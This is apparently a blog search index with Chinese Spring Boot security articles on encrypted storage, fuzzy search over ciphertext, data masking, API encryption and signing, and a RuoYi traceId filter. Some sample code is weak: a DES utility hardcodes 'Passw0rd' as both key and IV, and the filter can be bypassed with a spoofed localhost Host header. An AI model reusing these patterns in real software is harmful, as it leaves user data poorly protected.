97vlZQahK+y548ofQbXlW9JUwuzuj3xCkNF/is1KLa4= 2oQv5+y4+rVyN23IzudtOz+Zd7Aj1Bv2toBzmnwTXxo= 0Wj7qqLl6jWkBu+TcxuwGYcdIjv+zIJHDM7d1dU/c8D2jc2wLp+zVvpSwBKWjX44 然后我们可以测试对这条数据进行查询： @Test public void get() { User user = userDAO.selectById(1567405175268642818l); System.out.println(user); } 结果如下： User(id=1567405175268642818, name=shepherd, mobile=17812345678, idCard=213238199601182111, bankCard=3222022046741500, address=杭州市余杭区未来科技城) 基于以上完美展示了数据加密存储和解密查询。 ","date":"2024-05-13","objectID":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D%E5%92%8C%E8%84%B1%E6%95%8F/:2:2","tags":[],"title":"Spring Boot如何优雅实现数据加密存储、模糊匹配和脱敏","uri":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D%E5%92%8C%E8%84%B1%E6%95%8F/"},{"categories":["Java后端"],"content":"2.3 数据加密后怎么进行模糊匹配 密码、手机号、详细地址、银行卡号这些信息对加解密的要求也不一样，比如说密码我们需要加密存储，一般使用的都是不可逆的慢hash算法，慢hash算法可以避免暴力破解（典型的用时间换安全性）。 在检索时我们既不需要解密也不需要模糊查找，直接使用密文完全匹配，但是手机号就不能这样做，因为手机号我们要查看原信息，并且对手机号还需要支持模糊查找，因此我们今天就针对可逆加解密的数据支持模糊查询来看看有哪些实现方式。 我们接下来看看常规的做法，也是最广泛使用的方法，此类方法及满足的数据安全性，又对查询友好。 在数据库实现加密算法函数，在模糊查询的时候使用decode(key) like '%partial% 在数据库中实现与程序一致的加解密算法，修改模糊查询条件，使用数据库加解密函数先解密再模糊查找，这样做的优点是实现成本低，开发使用成本低，只需要将以往的模糊查找稍微修改一下就可以实现，但是缺点也很明显，这样做无法利用数据库的索引来优化查询，甚至有一些数据库可能无法保证与程序实现一致的加解密算法，但是对于常规的加解密算法都可以保证与应用程序一致。如果对查询性能要求不是特别高、对数据安全性要求一般，可以使用常见的加解密算法比如说AES、DES之类的也是一个不错的选择。 对密文数据进行分词组合，将分词组合的结果集分别进行加密，然后存储到扩展列，查询时通过key like '%partial%' [先对字符进行固定长度的分组，将一个字段拆分为多个，比如说根据4位英文字符（半角），2个中文字符（全角）为一个检索条件，举个例子 shepherd使用4个字符为一组的加密方式，第一组shep ，第二组heph ，第三组ephe ，第四组pher … 依次类推。 如果需要检索所有包含检索条件4个字符的数据比如：pher ，加密字符后通过 key like “%partial%” 查库。 分词加密实现 public static String splitValueEncrypt(String value, int splitLength) { //检查参数是否合法 if (StringUtils.isBlank(value) \u0026\u0026 splitLength \u003c= 0) { return null; } String encryptValue = \"\"; //获取整个字符串可以被切割成字符子串的个数 int n = (value.length() - splitLength + 1); //分词（规则：分词长度根据【splitLength】且每次分割的开始跟结束下标加一） for (int i = 0; i \u003c n; i++) { String splitValue = value.substring(i, splitLength++); encryptValue += encrypt(splitValue); } return encryptValue; } /** * 获取加密值 * * @param value 加密值 * @return */ private static String encrypt(String value) { // 这里进行加密 return null; } 基于上面分词加密保存到扩展列，同时要求对原字段的正删改查对需要对其相应的扩展列适配，还要注意由于分词之后导致扩展列的长度可能是原字段几倍甚至几十倍，所以务必在开发之前选择和合适分词长度和加密算法，一旦加密开始之后，再更改成本就较高了。像如果手机号我们只支持后8位搜索、身份证号只支持后4位搜索，这样我们就可以通过原字段截取后面位数直接加密存储到扩展列，不需要再分词。 ","date":"2024-05-13","objectID":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D%E5%92%8C%E8%84%B1%E6%95%8F/:2:3","tags":[],"title":"Spring Boot如何优雅实现数据加密存储、模糊匹配和脱敏","uri":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D%E5%92%8C%E8%84%B1%E6%95%8F/"},{"categories":["Java后端"],"content":"3.数据脱敏 实际的业务开发过程中，我们经常需要对用户的隐私数据进行脱敏处理。所谓脱敏处理其实就是将数据进行混淆隐藏，例如用户手机信息展示178****5939，以免泄露个人隐私信息。 ","date":"2024-05-13","objectID":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D%E5%92%8C%E8%84%B1%E6%95%8F/:3:0","tags":[],"title":"Spring Boot如何优雅实现数据加密存储、模糊匹配和脱敏","uri":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D%E5%92%8C%E8%84%B1%E6%95%8F/"},{"categories":["Java后端"],"content":"3.1实现思路 思路比较简单：在接口返回数据之前按要求对数据进行脱敏加工之后再返回前端。 一开始打算用@ControllerAdvice去实现，但发现需要自己去反射类获取注解，当返回对象比较复杂，需要递归去反射，性能一下子就会降低，于是换种思路，我想到平时使用的@JsonFormat，跟我现在的场景很类似，通过自定义注解跟字段解析器，对字段进行自定义解析。 脱敏字段类型枚举 public enum MaskEnum { /** * 中文名 */ CHINESE_NAME, /** * 身份证号 */ ID_CARD, /** * 座机号 */ FIXED_PHONE, /** * 手机号 */ MOBILE_PHONE, /** * 地址 */ ADDRESS, /** * 电子邮件 */ EMAIL, /** * 银行卡 */ BANK_CARD } 脱敏注解类：用在脱敏字段之上 @Retention(RetentionPolicy.RUNTIME) @JacksonAnnotationsInside @JsonSerialize(using = MaskSerialize.class) public @interface FieldMask { /** * 脱敏类型 * @return */ MaskEnum value(); } 脱敏序列化类 public class MaskSerialize extends JsonSerializer\u003cString\u003e implements ContextualSerializer { /** * 脱敏类型 */ private MaskEnum type; @Override public void serialize(String s, JsonGenerator jsonGenerator, SerializerProvider serializerProvider) throws IOException { switch (this.type) { case CHINESE_NAME: { jsonGenerator.writeString(MaskUtils.chineseName(s)); break; } case ID_CARD: { jsonGenerator.writeString(MaskUtils.idCardNum(s)); break; } case FIXED_PHONE: { jsonGenerator.writeString(MaskUtils.fixedPhone(s)); break; } case MOBILE_PHONE: { jsonGenerator.writeString(MaskUtils.mobilePhone(s)); break; } case ADDRESS: { jsonGenerator.writeString(MaskUtils.address(s, 4)); break; } case EMAIL: { jsonGenerator.writeString(MaskUtils.email(s)); break; } case BANK_CARD: { jsonGenerator.writeString(MaskUtils.bankCard(s)); break; } } } @Override public JsonSerializer \u003c?\u003e createContextual(SerializerProvider serializerProvider, BeanProperty beanProperty) throws JsonMappingException { // 为空直接跳过 if (beanProperty == null) { return serializerProvider.findNullValueSerializer(beanProperty); } // 非String类直接跳过 if (Objects.equals(beanProperty.getType().getRawClass(), String.class)) { FieldMask fieldMask = beanProperty.getAnnotation(FieldMask.class); if (fieldMask == null) { fieldMask = beanProperty.getContextAnnotation(FieldMask.class); } if (fieldMask != null) { // 如果能得到注解，就将注解的 value 传入 MaskSerialize return new MaskSe","date":"2024-05-13","objectID":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D%E5%92%8C%E8%84%B1%E6%95%8F/:3:1","tags":[],"title":"Spring Boot如何优雅实现数据加密存储、模糊匹配和脱敏","uri":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D%E5%92%8C%E8%84%B1%E6%95%8F/"},{"categories":["Java后端"],"content":"3.2使用示例 在发送短信记录的接口上对手机号进行脱敏： @FieldMask(MaskEnum.MOBILE_PHONE) private String mobile; 调用接口返回数据如下： { \"code\": 200, \"msg\": \"OK\", \"data\": { \"list\": [ { \"id\": 1565599123774607362, \"signId\": 8389008488923136, \"templateId\": 8445337328943104, \"templateType\": 1, \"content\": \"可爱的${name}，博客文章已于${submitTime}上传更新，请抽空浏览。\", \"channelType\": 0, \"mobile\": \"178****5939\", \"sendStatus\": 0, \"receiveStatus\": 0 } ], \"total\": 19, \"pages\": 19 } } ","date":"2024-05-13","objectID":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D%E5%92%8C%E8%84%B1%E6%95%8F/:3:2","tags":[],"title":"Spring Boot如何优雅实现数据加密存储、模糊匹配和脱敏","uri":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D%E5%92%8C%E8%84%B1%E6%95%8F/"},{"categories":["Java后端"],"content":"4.总结 基于上面内容我们总结如何在数据存储层进行数据安全加固来达到系统的更安全性，可以这么说没有最安全的系统只有更安全的系统。所以我们在开发历程中都会穷极一生去加固系统安全性能。当然了，加强系统安全性的方式还有很多种，我们最近只是围绕基于Spring Boot和SpringMVC框架中有效优雅地实现数据安全性，感兴趣的小伙伴可以自行了解其他加固方式。（近来复阳了，状态不是很好，效率不高所以有点拖拉更新啦） 作者：Shepherd 链接：https://juejin.cn/post/7238617870267580477 来源：稀土掘金 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 ","date":"2024-05-13","objectID":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D%E5%92%8C%E8%84%B1%E6%95%8F/:4:0","tags":[],"title":"Spring Boot如何优雅实现数据加密存储、模糊匹配和脱敏","uri":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%8A%A0%E5%AF%86%E5%AD%98%E5%82%A8%E6%A8%A1%E7%B3%8A%E5%8C%B9%E9%85%8D%E5%92%8C%E8%84%B1%E6%95%8F/"},{"categories":["Java后端"],"content":"1.背景 最近我司业务上需要对接第三方各大银行平台，调用第三方接口和提供接口供第三方调用，这时候的对外open接口安全性就得重视了，再有就是之前我在知乎上发布一篇**《Spring Security实现后端接口权限验证》**的总结，有个兄弟提出一个问题：只做接口功能菜单权限检验还不够，还得做数据权限检验才行，举个例子：用户A有删除某条数据的接口权限，这个接口的参数是传记录id来删除的(ps：平时我们开发接口也是这么做的)，后端执行的逻辑就是通过登录信息通过用户认证，然后再判断接口菜单权限，紧接着就执行如下SQL逻辑： delete from table where id=? 这里的id就是掉接口传递的参数，这时候假如用户B知道了怎么调接口，就根据id自增长的特性随意传id，就会删掉别人的数据，所以这是一个严重的问题，要解决这问题可以像上面说的一样加上数据权限，执行逻辑如下： delete from table where id=? and user_id = userId 这样就避免数据被别人操作了，也就是加上了数据权限判断，但是却给业务逻辑增加了复杂性同时老接口业务逻辑难以适配，本质上来说web页面上看到的数据就是根据用户角色做过数据隔离的，可以这么理解你能看到哪些数据和你有那些功能菜单操作权限就差不多避免上面所说的情况了，但是保不准懂代码的人使用postman等工具恶意调接口而产生上面的情况，我们还是得正视这个问题，既然通过数据权限解决该问题不太友好，那么我们可以再思考下怎么避免这个问题？？？这个问题可以转换为怎么避免别人轻易就能调通接口，解决办法就是不能在外网暴露接口信息，拒绝接口裸奔，从而有效提高接口安全性，这也是今天我们这篇总结的核心主旨。当然这里强调一下我这里说的是有效提高，不是绝对保证安全，做不到… 项目推荐：基于SpringBoot2.x、SpringCloud和SpringCloudAlibaba企业级系统架构底层框架封装，解决业务开发时常见的非功能性需求，防止重复造轮子，方便业务快速开发和企业技术栈框架统一管理。引入组件化的思想实现高内聚低耦合并且高度可配置化，做到可插拔。严格控制包依赖和统一版本管理，做到最少化依赖。注重代码规范和注释，非常适合个人学习和企业使用 Github地址：https://github.com/plasticene/plasticene-boot-starter-parent Gitee地址：https://gitee.com/plasticene3/plasticene-boot-starter-parent ","date":"2024-05-13","objectID":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E6%8F%90%E9%AB%98%E6%8E%A5%E5%8F%A3%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7/:1:0","tags":[],"title":"Spring Boot如何优雅提高接口数据安全性","uri":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E6%8F%90%E9%AB%98%E6%8E%A5%E5%8F%A3%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7/"},{"categories":["Java后端"],"content":"2.Spring Boot如何提高接口安全性 在Spring Boot项目中提高接口安全的核心所在：加密和加签，加固接口参数、验证复杂度。 **加密：**对参数进行加密传输，拒绝接口参数直接暴露，这样就可以有效做到防止别人轻易准确地获取到接口参数定义和传参格式要求了。 **加签：**对接口参数进行加签，可以有效防止接口参数被篡改和接口参数被重放恶刷。 ","date":"2024-05-13","objectID":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E6%8F%90%E9%AB%98%E6%8E%A5%E5%8F%A3%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7/:2:0","tags":[],"title":"Spring Boot如何优雅提高接口数据安全性","uri":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E6%8F%90%E9%AB%98%E6%8E%A5%E5%8F%A3%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7/"},{"categories":["Java后端"],"content":"2.1 加密 现今有许许多多的加密算法，这里就不对算法进行过度叙述，毕竟不是我们今天的主题，但是加密算法大体分为非对称加密和对称加密。 非对称加密 非对称加密算法是一种密钥的保密方法。非对称加密算法需要两个密钥：公开密钥（publickey:简称公钥）和私有密钥（privatekey:简称私钥）。公钥与私钥是一对，如果用公钥对数据进行加密，只有用对应的私钥才能解密。因为加密和解密使用的是两个不同的密钥，所以这种算法叫作非对称加密算法。 对称加密 加密秘钥和解密秘钥是一样，当你的密钥被别人知道后，就没有秘密可言了。 经过需求分析和科学借鉴我们采用了非对称加密算法RSA和对称加密算法AES来完成接口加密。至于这两种加密算法的原理与实现有兴趣自己去查资料，我这里就说一下选它们的原因： AES 是对称加密算法，优点：加密速度快；缺点：如果秘钥丢失，就容易解密密文，安全性相对比较差 RSA 是非对称加密算法 ， 优点：安全 ；缺点：加密速度慢 接口参数加解密的流程大致如图所示： 具体步骤如下： 客户端(调用接口方)随机生成AES加解密的密钥aes key，这里的AES密钥每次调接口都需要随机生成，可以有效提高安全性。 使用aes key对接口参数requestBody进行加密，data=base64(AES(json参数)) 通过RSA加密算法加密aes key，有效保证aes算法的密钥的可靠安全性 key=base64(RSA(aes key)) 经过上面的步骤，得到了加密后的业务参数及密钥，这时候就可以发送请求调用接口了 服务端接收到请求之后，先通过RSA算法对key进行解密获取到ase key， 再通过aes key解密data得到真正json参数，最后映射到接口方法的参数对象上，供controller的业务方法逻辑使用。 业务方法执行完成后，对响应参数进行加密，加密流程和上面的1、2、3一样 客户端收到响应参数之后，和步骤5一样解密响应参数，就拿到了真正的数据结果了。 ","date":"2024-05-13","objectID":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E6%8F%90%E9%AB%98%E6%8E%A5%E5%8F%A3%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7/:2:1","tags":[],"title":"Spring Boot如何优雅提高接口数据安全性","uri":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E6%8F%90%E9%AB%98%E6%8E%A5%E5%8F%A3%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7/"},{"categories":["Java后端"],"content":"2.2 加签 签名验证也是当下提高接口安全性主要措施之一，核心就是客户端在调用接口时按照一定规则生成签名sign，服务端拿到签名sign之后进行验证操作，大致流程如下： 具体步骤： 对请求参数对象bean转sortMap保证参数拼接的有序性，如果接口没有参数也没有关系，这里转成一个空的sortMap 按照约定拼接生成字符串content = sortMap + nonce + timestamp 使⽤SHA1WithRSA算法及私钥对concent进⾏签名sign 服务端判断timestamp是否超过签名有效期和nonce是否重复使用 服务端和步骤2一样规则生成字符串content 使⽤SHA1WithRSA算法及公钥对concent和sign进行验签 ","date":"2024-05-13","objectID":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E6%8F%90%E9%AB%98%E6%8E%A5%E5%8F%A3%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7/:2:2","tags":[],"title":"Spring Boot如何优雅提高接口数据安全性","uri":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E6%8F%90%E9%AB%98%E6%8E%A5%E5%8F%A3%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7/"},{"categories":["Java后端"],"content":"3.优雅实现接口加密、加签 在实现这个需求时，考虑到全公司的多个团队开发使用的通用性和便捷性，所以我们对加密、加签操作进行了公共的抽取封装，同时通过一个注解@ApiSecurity来标识接口是否需要进行加密、加签操作，在业务侧极大程度地降低了开发使用成本，不用写冗余代码，做到了真正的优雅。 @Retention(RetentionPolicy.RUNTIME) @Target({ElementType.TYPE, ElementType.METHOD}) @Documented public @interface ApiSecurity { @Alias(\"isSign\") boolean value() default true; /** * 是否加签验证，默认开启 * @return */ @Alias(\"value\") boolean isSign() default true; /** * 接口请求参数是否需要解密 * @return */ boolean decryptRequest() default false; /** * 接口响应参数是否需要加密 * @return */ boolean encryptResponse() default false; } 这里注解属性可以看到签名验证默认是开启的，因为我们认为接口安全性加签是必须的，至于参数加解密可以视情况而定，通过属性配置开关，做到了极致的灵活性，这也是优雅呀。 使用案例：下面就是一个需要加密加签的接口 @PostMapping(\"/security\") @ApiSecurity(encryptResponse = true, decryptRequest = true) public User testApiSecurity(@RequestBody User user) { System.out.println(user); return user; } 可以看到我们在项目业务服务中只需要@ApiSecurity就可以了，就是这么简单，至于怎么实现的下面我们就来看看。 为了全公司对接口加密、加签功能实现统一和规范，我们将实现抽取，封装集成在公司自定义的web starter中，这样只要项目服务引入这个starter依赖就可以使用该功能了 首先我们对加密传输的参数bean进行规定封装如下： @Data public class ApiSecurityParam { /** * 应用id */ private String appId; /** * RSA加密后的aes秘钥，需解密 */ private String key; /** * AES加密的json参数 */ private String data; /** * 签名 */ private String sign; /** * 时间戳 */ private String timestamp; /** * 请求唯一标识 */ private String nonce; } 等于说加密、加签的参数格式，调用方需按照上面的对象传参，当然为了提高拓展性，签名的相关信息sign、timestamp、nonce可以放到请求的header里面，也能获取到。拿到apiSecurityParam我们就可以进行请求参数解密、验签了，需要通过判断是否使用了注解@ApiSecuriy来决定是否执行请求参数解密、验签逻辑，这就正好可以使用基于注解的切面实现啦，在说切面之前，先说说一次接口请求requestBody的输入流InputStream只能读取一次，就是说request.getInputStream()只能使用一次，原因如下： 因为流对应的是数据，数据放在内存中，有的是部分放在内存中。read 一次标记一次当前位置（mark position），第二次read就从标记位置继续读（从内存中copy）数据。 所以这就是为什么读了一次第二次是空了。 怎么让它不为空呢？只要inputstream 中的pos 变成0就可以重写读取当前内存中的数据。javaAPI中有一个方法public void reset() 这个方法就是可以重置pos为起始位置，但是不是所有的IO读取流都可以调用该方法！ServletInputStream是不能调用reset方法，这就导致了只能调用一次getInputStream()。 而我们需要先读取出requestBody进行解密，然后拿到解密之前的参数映射到真正的接口方法参数对象里，所以必须解决这个问题。 解决方法就是原始的HttpServletRequest的InputStream只能读取一下，那么我们就重新自定义封装一个HttpServletRequest可以实现多次读取。 public cl","date":"2024-05-13","objectID":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E6%8F%90%E9%AB%98%E6%8E%A5%E5%8F%A3%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7/:3:0","tags":[],"title":"Spring Boot如何优雅提高接口数据安全性","uri":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E6%8F%90%E9%AB%98%E6%8E%A5%E5%8F%A3%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7/"},{"categories":["Java后端"],"content":"4.总结 至此，对于Spring Boot如何提高接口安全性的思路与实现已讲完，同时我们也尽量进行了抽取封装，做到了极致的优雅实现。当然这里还是要再次强调一下以上的思路实现是不能绝对保证接口安全性的，只能做到”防君子不妨小人“，可以这么说假如不做加密加签这些保护措施，黑客破解接口就会不费吹灰之力. 最后奉上全部代码地址：https://github.com/plasticene/plasticene-boot-starter-parent/tree/main/plasticene-boot-starter-web 作者：Shepherd 链接：https://mp.weixin.qq.com/s?__biz=Mzg5MDY1NzI0MQ==\u0026mid=2247486045\u0026idx=1\u0026sn=1ed52c5433908d483045916a142a12d2\u0026chksm=cfd80aebf8af83fd9c001bdb99ee5427b50e5c2f79b009a6073abe48a0670d378b18dae376b2\u0026token=1312864910\u0026lang=zh_CN#rd 来源： Shepherd进阶笔记(微信公众号) 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 ","date":"2024-05-13","objectID":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E6%8F%90%E9%AB%98%E6%8E%A5%E5%8F%A3%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7/:4:0","tags":[],"title":"Spring Boot如何优雅提高接口数据安全性","uri":"/posts/spring-boot%E5%A6%82%E4%BD%95%E4%BC%98%E9%9B%85%E6%8F%90%E9%AB%98%E6%8E%A5%E5%8F%A3%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E6%80%A7/"},{"categories":["Java后端","ruoyi"],"content":"业务背景 前后端接口调用适用Restful风格，有接口级别的用户权限加校验，同时也包含部分对外公用接口（不鉴权调用），此时为了防止第三方频繁恶意刷新接口，加traceid请求头校验。 ","date":"2024-04-28","objectID":"/posts/ruoyi%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%9E%E7%8E%B0%E5%89%8D%E5%90%8E%E7%AB%AFtraceid%E5%8A%A0%E5%AF%86%E6%A0%A1%E9%AA%8C/:0:1","tags":["ruoyi"],"title":"ruoyi自定义实现前后端traceid加密校验","uri":"/posts/ruoyi%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%9E%E7%8E%B0%E5%89%8D%E5%90%8E%E7%AB%AFtraceid%E5%8A%A0%E5%AF%86%E6%A0%A1%E9%AA%8C/"},{"categories":["Java后端","ruoyi"],"content":"业务设计 ","date":"2024-04-28","objectID":"/posts/ruoyi%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%9E%E7%8E%B0%E5%89%8D%E5%90%8E%E7%AB%AFtraceid%E5%8A%A0%E5%AF%86%E6%A0%A1%E9%AA%8C/:0:2","tags":["ruoyi"],"title":"ruoyi自定义实现前后端traceid加密校验","uri":"/posts/ruoyi%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%9E%E7%8E%B0%E5%89%8D%E5%90%8E%E7%AB%AFtraceid%E5%8A%A0%E5%AF%86%E6%A0%A1%E9%AA%8C/"},{"categories":["Java后端","ruoyi"],"content":"业务代码 请求头traceid过滤器 import com.alibaba.fastjson2.JSON; import com.ruoyi.common.core.domain.AjaxResult; import com.ruoyi.common.utils.ServletUtils; import com.ruoyi.common.utils.StringUtils; import com.ruoyi.common.utils.request.RequestCryptoUtil; import com.ruoyi.framework.aspectj.LogAspect; import org.slf4j.Logger; import org.slf4j.LoggerFactory; import org.springframework.http.HttpHeaders; import org.springframework.stereotype.Component; import org.springframework.web.filter.OncePerRequestFilter; import org.springframework.web.server.ServerWebExchange; import reactor.core.publisher.Mono; import javax.servlet.FilterChain; import javax.servlet.ServletException; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.util.List; @Component public class RequestHeaderTimeFilter extends OncePerRequestFilter { private static final Boolean LOCAL_REQUEST_CHECK = false; private static final Long TIME_OUT = Long.valueOf(1*60*1000); private static final Logger log = LoggerFactory.getLogger(LogAspect.class); @Override protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException { String requestId = \"traceId\"; String traceId = request.getHeader(requestId); String host = request.getHeader(\"Host\"); //本地开发测试直接跳过 //非本地请求校验请求id if(StringUtils.isEmpty(host)){ timeOutResponse(request,response,\"非法请求,host为空\"); return; } if(!host.startsWith(\"localhost\") || LOCAL_REQUEST_CHECK){ if(StringUtils.isNotEmpty(traceId)){ try { String timestamp = RequestCryptoUtil.decrypt(traceId); if(System.currentTimeMillis() - Long.valueOf(timestamp) \u003e TIME_OUT){ timeOutResponse(request,response,\"检查异常：非法请求，禁止非法抓包哦\"); return; } } catch (Exception e) { timeOutResponse(request,response,\"请求异常，the secrect is wrong\"); return; } }else{ timeOutResponse(request,response,\"非法请求,traceId为空\"); return; } } filterChain.doFilter(request,response); } private void ","date":"2024-04-28","objectID":"/posts/ruoyi%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%9E%E7%8E%B0%E5%89%8D%E5%90%8E%E7%AB%AFtraceid%E5%8A%A0%E5%AF%86%E6%A0%A1%E9%AA%8C/:0:3","tags":["ruoyi"],"title":"ruoyi自定义实现前后端traceid加密校验","uri":"/posts/ruoyi%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%9E%E7%8E%B0%E5%89%8D%E5%90%8E%E7%AB%AFtraceid%E5%8A%A0%E5%AF%86%E6%A0%A1%E9%AA%8C/"},{"categories":["Java后端","ruoyi"],"content":"另外一种加密代码 package com.ruoyi.common.utils; /* * Copyright 2019-2020 Zheng Jie * * Licensed under the Apache License, Version 2.0 (the \"License\"); * you may not use this file except in compliance with the License. * You may obtain a copy of the License at * * http://www.apache.org/licenses/LICENSE-2.0 * * Unless required by applicable law or agreed to in writing, software * distributed under the License is distributed on an \"AS IS\" BASIS, * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. * See the License for the specific language governing permissions and * limitations under the License. */ import javax.crypto.Cipher; import javax.crypto.SecretKey; import javax.crypto.SecretKeyFactory; import javax.crypto.spec.DESKeySpec; import javax.crypto.spec.IvParameterSpec; import java.nio.charset.StandardCharsets; /** * 加密 * @author Zheng Jie * @date 2018-11-23 */ public class EncryptUtils { private static final String STR_PARAM = \"Passw0rd\"; private static Cipher cipher; private static final IvParameterSpec IV = new IvParameterSpec(STR_PARAM.getBytes(StandardCharsets.UTF_8)); private static DESKeySpec getDesKeySpec(String source) throws Exception { if (source == null || source.length() == 0){ return null; } cipher = Cipher.getInstance(\"DES/CBC/PKCS5Padding\"); String strKey = \"Passw0rd\"; return new DESKeySpec(strKey.getBytes(StandardCharsets.UTF_8)); } /** * 对称加密 */ public static String desEncrypt(String source) throws Exception { DESKeySpec desKeySpec = getDesKeySpec(source); SecretKeyFactory keyFactory = SecretKeyFactory.getInstance(\"DES\"); SecretKey secretKey = keyFactory.generateSecret(desKeySpec); cipher.init(Cipher.ENCRYPT_MODE, secretKey, IV); return byte2hex( cipher.doFinal(source.getBytes(StandardCharsets.UTF_8))).toUpperCase(); } /** * 对称解密 */ public static String desDecrypt(String source) throws Exception { byte[] src = hex2byte(source.getBytes(StandardCharsets.UTF_8)); DESKeySpec desKeySpec = getDesKeySpec(source); SecretKeyFactory keyFactor","date":"2024-04-28","objectID":"/posts/ruoyi%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%9E%E7%8E%B0%E5%89%8D%E5%90%8E%E7%AB%AFtraceid%E5%8A%A0%E5%AF%86%E6%A0%A1%E9%AA%8C/:0:4","tags":["ruoyi"],"title":"ruoyi自定义实现前后端traceid加密校验","uri":"/posts/ruoyi%E8%87%AA%E5%AE%9A%E4%B9%89%E5%AE%9E%E7%8E%B0%E5%89%8D%E5%90%8E%E7%AB%AFtraceid%E5%8A%A0%E5%AF%86%E6%A0%A1%E9%AA%8C/"},{"categories":["开发板"],"content":"通信接口介绍-UART（通用异步接收器发送器） 通用异步收发传输器（Universal Asynchronous 